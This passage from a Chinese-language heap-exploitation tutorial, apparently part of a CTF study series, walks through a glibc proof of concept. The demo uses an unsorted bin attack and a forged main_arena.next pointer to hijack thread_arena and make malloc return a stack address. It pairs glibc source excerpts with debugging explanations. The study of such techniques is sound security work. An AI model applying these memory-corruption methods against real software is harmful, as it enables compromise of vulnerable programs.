class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (BINMAP + <span class="number">0x20</span>)) = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The unsorted bin should now look like this\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;head -&gt; main-arena -&gt; FAST40 -&gt; INTM -&gt; narenas-0x10\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;     bk            bk        bk      bk\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We can now trigger the unsorted bin attack by requesting the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;INTM chunk as an exact fit.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * request the INTM chunk from the unsorted bin</span></span><br><span class="line"><span class="comment">     * in order to trigger a partial unlinking between</span></span><br><span class="line"><span class="comment">     * head and narenas-0x10.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    INTM = <span class="built_in">malloc</span>(<span class="number">0x98</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Perfect. narenas is now set to the address of the unsorted bin&#x27;s head\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;which should be large enough to exceed the existing arena limit.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s proceed with the manipulation of the main_arena.next pointer\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;within our previously allocated binmap-chunk. The address we write\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;to this field will become the future value of thread_arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * set main_arena.next to an arbitrary address. The</span></span><br><span class="line"><span class="comment">     * next two calls to malloc will overwrite thread_arena</span></span><br><span class="line"><span class="comment">     * with the same address. I&#x27;ll reuse INTM as fake arena.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Note, that INTM is not suitable as fake arena but</span></span><br><span class="line"><span class="comment">     * nevertheless, it is an easy way to demonstrate that</span></span><br><span class="line"><span class="comment">     * we are able to set thread_arena to an arbitrary address.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (BINMAP + <span class="number">0x8</span>)) = (<span class="type">uint64_t</span>) (INTM - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Done. Now all what&#x27;s left to do is to trigger two calls to the reused_arena()\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function by making two requests for an invalid chunksize.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * the first call will force the reused_arena()</span></span><br><span class="line"><span class="comment">     * function to set thread_arena to the address of</span></span><br><span class="line"><span class="comment">     * the current main-arena.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xffffffffffffffbf</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * the second call will force the reused_arena()</span></span><br><span class="line"><span class="comment">     * function to set thread_arena to the address stored</span></span><br><span class="line"><span class="comment">     * in main_arena.next - our fake arena.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xffffffffffffffbf</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We did it. We hijacked the thread_arena symbol and from now on memory\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;requests will be serviced by our fake arena. Let&#x27;s check this out\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;by allocating a fakechunk on the stack from one of the fastbins\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;of our new fake arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * construct a 0x70-fakechunk on the stack...</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">uint64_t</span> fakechunk[<span class="number">4</span>] = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="number">0x0000000000000000</span>, <span class="number">0x0000000000000073</span>,</span><br><span class="line">        <span class="number">0x4141414141414141</span>, <span class="number">0x0000000000000000</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * ...and place it in the 0x70-fastbin of our fake arena</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (INTM + <span class="number">0x20</span>)) = (<span class="type">uint64_t</span>) (fakechunk);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fakechunk in position at stack address %p\n&quot;</span>, fakechunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Target data within the fakechunk at address %p\n&quot;</span>, &amp;fakechunk[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Its current value is %#lx\n\n&quot;</span>, fakechunk[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And after requesting a 0x70-chunk...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * use the fake arena to perform arbitrary allocations</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *FAKECHUNK = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...malloc returns us the fakechunk at %p\n\n&quot;</span>, FAKECHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Overwriting the newly allocated chunk changes the target\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data as well: &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * overwriting the target data</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (FAKECHUNK)) = <span class="number">0x4242424242424242</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#lx\n&quot;</span>, fakechunk[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * confirm success</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">assert</span>(fakechunk[<span class="number">2</span>] == <span class="number">0x4242424242424242</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><p>先了解一下 <code>binmap</code> 的用处。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_state</span></span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next_free;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>binmap</code> 在 <code>malloc</code> 过程中的下面两个场景会被修改：</p>
<ol>
<li>在遍历 <code>unsorted bin</code> 中的空闲 <code>chunk</code> 时如果将该 <code>chunk</code> 放入对应的 <code>small bin</code> 或 <code>large bin</code> 中会在 <code>binmap</code> 对应位置置位。</li>
</ol>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mark_bin</span>(av, victim_index); </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i) ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))</span></span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>在遍历 <code>small bin + large bin</code> 找大小不小于当前 <code>chunk</code> 的空闲 <code>chunk</code> 时如果对应 <code>binmap</code> 置位的 <code>bin</code> 是空闲的就将对应位置复位。</li>
</ol>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">av-&gt;binmap[block] = map &amp;= ~bit;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-18"><a href="#调试-18" class="headerlink" title="调试"></a>调试</h3><p>首先申请依次申请 <code>SMALLCHUNK_0x90, FASTCHUNK_0x20, FASTCHUNK_0x40</code>，然后将 <code>SMALLCHUNK_0x90</code> 释放到 <code>unsorted bin</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027200937204.png"
                      alt="image-20231027200937204"
                ></p>
<p>然后申请 <code>SMALLCHUNK_0xa0(INTM)</code>，这时候会触发第一个改变 <code>binmap</code> 的条件，会将 <code>binmap[0]</code> 改为 <code>0x200</code>，我们将其作为<code>fake_chunk_size</code>，暂且叫包含 <code>binmap</code> 的 <code>fake_chunk</code> 叫 <code>BINMAP</code>。并将 <code>SMALLCHUNK_0x90</code> 放进 <code>small_bin_0x90</code> 的位置上。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027201346420.png"
                      alt="image-20231027201346420"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027201322231.png"
                      alt="image-20231027201322231"
                ></p>
<p>然后重新申请 <code>SMALLCHUNK_0x90</code>，再将其释放到 <code>unsorted_bin</code> 中。利用 <code>UAF</code> 漏洞将其 <code>SMALLCHUNK_0x90.bk-&gt;&amp;main_arena.bins[253]</code>，也就是 <code>fake_chunk_prevsize</code>。 再将 <code>FASTCHUNK_0x40.bk-&gt;(SMALLCHUNK_0xa0)INTM</code>，然后释放 <code>FASTBIN_0x20, FASTBIN_0x40</code>。其中 <code>FASTBIN_0x20</code> 正好位于 <code>main_arena_size</code>  的位置，其作用是确保 <code>main_arena</code> 所在的 <code>fake chunk</code> 的 <code>size</code> 大于 <code>2 * SIZE_SZ</code> 此时 <code>unsorted bin</code> 结构如下。</p>
<p><em>(因为 <code>binmap</code> 数组是 <code>uint</code> 类型是 <code>4</code> 字节大小，所以 <code>fake_chunk_binmap.bk == next</code> ，<code>next</code> 指针指向 <code>&amp;main_arena</code>)</em></p>
<p><code>head.bk -&gt; SMALLCHUNK_0x90.bk -&gt; BINMAP.bk -&gt; main-arena.bk -&gt; FASTCHUNK_0x40.bk -&gt; INTM</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027202331065.png"
                      alt="image-20231027202331065"
                ></p>
<p>此时申请 <code>0x1f8</code> 大小的 <code>chunk</code> 将会把正好合适的 <code>BINMAP</code> 申请出来。之后我们考虑通过如何把 <code>arena</code> 切换到 伪造的 <code>arena</code> 上。在 <code>__libc_malloc</code> 上，我们通过 <code>arena_get</code> 来获取 <code>arena</code> 。由于 <code>arena</code> 的 <code>flags</code> 的值一般为 <code>0</code> ，因此将宏展开后发现实际上是获取的 <code>thread_arena</code> 的值。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size)   \</span></span><br><span class="line"><span class="meta">    do &#123;                       \</span></span><br><span class="line"><span class="meta">        ptr = thread_arena;    \</span></span><br><span class="line"><span class="meta">        arena_lock(ptr, size); \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br></pre></td></tr></table></figure></div>

<p>在 <code>arena_get</code> 获取 <code>arena</code> 后会调用 <code>_int_malloc</code> 尝试申请内存，如果 <code>_int_malloc</code> 返回 <code>NULL</code> 则调用 <code>arena_get_retry</code> 和 <code>_int_malloc</code> 尝试再次分配内存。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">arena_get</span>(ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line"><span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">   before.  */</span></span><br><span class="line"><span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">LIBC_PROBE</span>(memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">    ar_ptr = <span class="built_in">arena_get_retry</span>(ar_ptr, bytes);</span><br><span class="line">    victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于 <code>arena</code> 为 <code>main_arena</code> ，因此实际上调用的是 <code>arena_get2</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> mstate</span></span><br><span class="line"><span class="function"><span class="title">arena_get_retry</span><span class="params">(mstate ar_ptr, <span class="type">size_t</span> bytes)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LIBC_PROBE</span>(memory_arena_retry, <span class="number">2</span>, bytes, ar_ptr);</span><br><span class="line">    <span class="keyword">if</span> (ar_ptr != &amp;main_arena) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        (<span class="type">void</span>) <span class="built_in">mutex_unlock</span>(&amp;ar_ptr-&gt;mutex);</span><br><span class="line">        ar_ptr = <span class="built_in">arena_get2</span>(bytes, ar_ptr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ar_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>arena_get2</code> 函数中，如果 <code>n &lt;= narenas_limit - 1</code> 则调用 <code>_int_new_arena</code> 创建一个新的 <code>arena</code> 。否则调用 <code>reused_arena</code> 从现有的 <code>arena</code> 中找一个可用的 <code>arena</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> mstate internal_function <span class="title">arena_get2</span><span class="params">(<span class="type">size_t</span> size, mstate avoid_arena)</span> </span>&#123;</span><br><span class="line">    mstate a;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">    a = <span class="built_in">get_free_list</span>(); <span class="comment">// 调试发现返回 NULL</span></span><br><span class="line">    <span class="keyword">if</span> (a == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">        <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>)</span><br><span class="line">                narenas_limit = mp_.arena_max;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test) &#123;</span><br><span class="line">                <span class="type">int</span> n = __get_nprocs();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                    narenas_limit = <span class="built_in">NARENAS_FROM_NCORES</span>(n);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                    narenas_limit = <span class="built_in">NARENAS_FROM_NCORES</span>(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">        <span class="type">size_t</span> n = narenas;</span><br><span class="line">        <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(n &lt;= narenas_limit - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">catomic_compare_and_exchange_bool_acq</span>(&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">                <span class="keyword">goto</span> repeat;</span><br><span class="line">            a = _int_new_arena(size);</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(a == <span class="literal">NULL</span>))</span><br><span class="line">                <span class="built_in">catomic_decrement</span>(&amp;narenas);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            a = <span class="built_in">reused_arena</span>(avoid_arena);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>reused_arena</code> 从 <code>next_to_use</code> 开始沿 <code>arena.next</code> 链表找第一个满足 <code>!arena_is_corrupt(result) &amp;&amp; !mutex_trylock(&amp;result-&gt;mutex)</code> 的 <code>arena</code> ，并且会将找到的 <code>arena</code> 赋值给 <code>thread_arena</code> ，然后更新 <code>next_to_use</code> 为下一个 <code>arena</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> narenas = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> mstate</span></span><br><span class="line"><span class="function"><span class="title">reused_arena</span><span class="params">(mstate avoid_arena)</span> </span>&#123;</span><br><span class="line">    mstate result;</span><br><span class="line">    <span class="comment">/* <span class="doctag">FIXME:</span> Access to next_to_use suffers from data races.  */</span></span><br><span class="line">    <span class="type">static</span> mstate next_to_use;</span><br><span class="line">    <span class="keyword">if</span> (next_to_use == <span class="literal">NULL</span>)</span><br><span class="line">        next_to_use = &amp;main_arena;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Iterate over all arenas (including those linked from</span></span><br><span class="line"><span class="comment">     free_list).  */</span></span><br><span class="line">    result = next_to_use;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">arena_is_corrupt</span>(result) &amp;&amp; !<span class="built_in">mutex_trylock</span>(&amp;result-&gt;mutex))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* <span class="doctag">FIXME:</span> This is a data race, see _int_new_arena.  */</span></span><br><span class="line">        result = result-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">while</span> (result != next_to_use);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">out:</span><br><span class="line">    ...</span><br><span class="line">    thread_arena = result;</span><br><span class="line">    next_to_use = result-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以修改 <code>main_arena.next</code> 指向伪造的 <code>arena</code> 然后两次调用 <code>malloc(0xffffffffffffffbf + 1)</code>，（第一次调用<code>result==&amp;main_arena;next_to_use==INTM</code>）; 通过 <code>checked_request2size(bytes, nb);</code> 宏使得 <code>_int_malloc</code> 返回 <code>NULL</code>，最终使得 <code>thread_arena</code> 指向我们伪造的 <code>arena</code> 。</p>
<p>首先需要确保 <code>narenas &gt; narenas_limit - 1</code> 从而调用 <code>reused_arena</code> ，因此要构造 <code>unsorted bin attack</code> 将 <code>narenas</code> 改成一个较大的数。为了确保从 <code>unsorted bin</code> 中取出的 <code>chunk</code> 能通过 <code>victim-&gt;size &gt; av-&gt;system_mem</code> 检查，我们将 <code>main_arena.system_mem</code> 赋值为<code> 0xffffffffffffffff</code> 。将 <code>INTM.bk</code> 指向 <code>&amp;narenas - 0x10</code> 构造 <code>unsorted bin attack </code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027205809961.png"
                      alt="image-20231027205809961"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027210017826.png"
                      alt="image-20231027210017826"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027205922973.png"
                      alt="image-20231027205922973"
                ></p>
<p>申请 <code>0xa0</code> 大小的 <code>chunk</code> （申请被构造在 <code>unsorted bin</code> 的 <code>INTM</code>）触发 <code>unsorted bin attack</code>。此时 <code>arenas</code> 上被写入了 <code>&amp;main_arena.top</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027210544449.png"
                      alt="image-20231027210544449"
                ></p>
<p>将 <code>main_arena.next</code> 指向 <code>INTM</code> ，连续两次 <code>malloc(0xffffffffffffffbf + 1);</code> 将 <code>thread_arena</code> 指向我们伪造的 <code>INTM</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027210759803.png"
                      alt="image-20231027210759803"
                ></p>
<p>伪造如下 <code>fast_chunk</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027211024351.png"
                      alt="image-20231027211024351"
                ></p>
<p>之后将 <code>(uint64_t) (INTM_prev+0x30)</code> 指向伪造的 <code>chunk</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027211133139.png"
                      alt="image-20231027211133139"
                ></p>
<p>此时如果 <code>malloc(0x68)</code> 就会将目标地址处的内存申请出来。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027211207749.png"
                      alt="image-20231027211207749"
                ></p>
<h1 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h1><p>第五部分开始使用 <code>ubuntu:18.04</code> 编译。<code>Tcache</code> 基础请看 <a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-278105.htm" >Tcache安全机制及赛题详细解析(gundam &amp;&amp; House of Atum) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
